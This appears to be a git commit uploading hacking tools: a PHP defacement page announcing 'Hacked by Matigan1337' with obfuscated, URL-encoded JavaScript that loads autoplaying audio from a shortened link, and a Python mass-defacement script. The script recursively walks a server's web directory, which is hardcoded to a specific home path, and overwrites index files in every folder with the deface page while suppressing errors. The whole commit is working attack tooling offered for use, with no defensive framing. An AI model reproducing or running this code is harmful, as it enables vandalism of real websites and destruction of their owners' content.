1eddedc5dbea95e77d83e8a9cec1f89e1bfd7cd9
dombatersesat666 <43029885+dombatersesat666@users.noreply.github.com>
2022-03-13 05:37:59 -0400

    Add files via upload

---
+++ 1337.php
@@ -0,0 +1,43 @@
+<!doctype html>
+<html>
+<head>
+<title>Hacked by Matigan1337</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="keywords" content="Hacked by Matigan1337">
+<meta name="description" content="Hacked by Matigan1337">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Iceland">
+</head>
+<style type="text/css">
+    body{
+        background: 141414;
+        baclground-color: 141414;
+        text-align: center;
+        background-position: center;
+    }
+</style>
+</head>
+<body bgcolor="#141414">
+<div align="center">
+            <span style="font-weight: 400">
+			<p align="center">
+<br>
+<font face="Iceland" size="50" color="red"><b>Hacked by Matigan1337</b></font><br>
+<br>
+<br>
+<br>
+
+<br><font face="Iceland" size="20" color="#32cd32"><b></b>HUMAN ERROR</font><br>
+<br>
+<br>
+<!--  <br><font face="Iceland" size="20" color="00ff00"><a href="pornhub.com"> YOUR DB LEAK <b></b></font><br> -->
+<br> </font></i> <font color="white" size="6"><font color="red"><font size="3" color="white"><br><br> <font color="white" size="3">| Foursdeath Team Official |
+<br>
+<Script Language='Javascript'>
+document.write(unescape('%3C%61%75%64%69%6F%20%61%75%74%6F%70%6C%61%79%20%69%64%3D%22%6D%79%5F%61%75%64%69%6F%22%20%73%72%63%3D%22%68%74%74%70%73%3A%2F%2F%62%69%74%2E%6C%79%2F%33%4B%36%71%73%54%64%22%20%6C%6F%6F%70%3D%22%6C%6F%6F%70%22%3E%3C%2F%61%75%64%69%6F%3E%0A%3C%73%63%72%69%70%74%3E%0A%0A%77%69%6E%64%6F%77%2E%6F%6E%6C%6F%61%64%20%3D%20%66%75%6E%63%74%69%6F%6E%28%29%20%7B%0A%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%22%6D%79%5F%61%75%64%69%6F%22%29%2E%70%6C%61%79%28%29%3B%0A%7D'));
+</Script>
+<br>
+<br>
+
+
+<!-- Created By Matigan1337  -->
+<!-- </html> -->
---
+++ mas.py
@@ -0,0 +1,38 @@
+import os
+
+print("""
+
+
+ __    __     ______     ______     ______        _____     ______     ______   ______     ______     ______    
+/\ "-./  \   /\  __ \   /\  ___\   /\  ___\      /\  __-.  /\  ___\   /\  ___\ /\  __ \   /\  ___\   /\  ___\   
+\ \ \-./\ \  \ \  __ \  \ \___  \  \ \___  \     \ \ \/\ \ \ \  __\   \ \  __\ \ \  __ \  \ \ \____  \ \  __\   
+ \ \_\ \ \_\  \ \_\ \_\  \/\_____\  \/\_____\     \ \____-  \ \_____\  \ \_\    \ \_\ \_\  \ \_____\  \ \_____\ 
+  \/_/  \/_/   \/_/\/_/   \/_____/   \/_____/      \/____/   \/_____/   \/_/     \/_/\/_/   \/_____/   \/_____/ 
+                                                                                                                
+		BY MATIGAN 1337
+
+
+	                                           
+
+	""")
+
+sc = "index.php"   	#your file deface
+disk = "/home/ictcksa/" 	# path to deface example /var/www/
+print("[*] Please wait ...")
+
+
+def mass(root):
+	try:
+		x = os.listdir(root)
+		for i in x:
+			folder = os.path.join(root,i)
+			if os.path.isdir(folder):
+				buka = open(sc, "r").read()
+				path = os.path.join(folder,sc)
+				open(path, "w").write(buka)
+				mass(folder)
+	except:
+		pass
+
+print("[!] Done !")
+mass(disk)
